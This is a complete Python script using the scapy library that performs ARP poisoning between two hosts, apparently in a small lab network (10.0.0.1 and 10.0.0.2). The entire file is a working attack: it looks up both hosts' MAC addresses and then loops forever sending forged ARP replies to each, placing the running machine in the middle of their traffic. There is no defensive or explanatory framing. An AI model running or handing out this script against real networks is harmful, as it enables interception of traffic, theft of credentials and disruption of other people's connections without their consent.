from scapy.all import *
import time

def get_mac(ip):
    # Requesting MAC for given IP
    answered_list = arping(ip, verbose=False, timeout=2)[0]
    return answered_list[0][1].hwsrc if answered_list else None

def arp_poison(target_ip, gateway_ip):
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if target_mac is None or gateway_mac is None:
        print(f"[Error] Could not get MAC for {target_ip} or {gateway_ip}")
        return

    print(f"Poisoning {target_ip} and {gateway_ip}")

    while True:
        send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
        send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
        time.sleep(2)

if __name__ == "__main__":
    try:
        # Assuming h1 (10.0.0.1) and h2 (10.0.0.2)
        arp_poison("10.0.0.1", "10.0.0.2")
    except KeyboardInterrupt:
        print("\n[INFO] Stopping ARP poisoning.")
        exit(0)
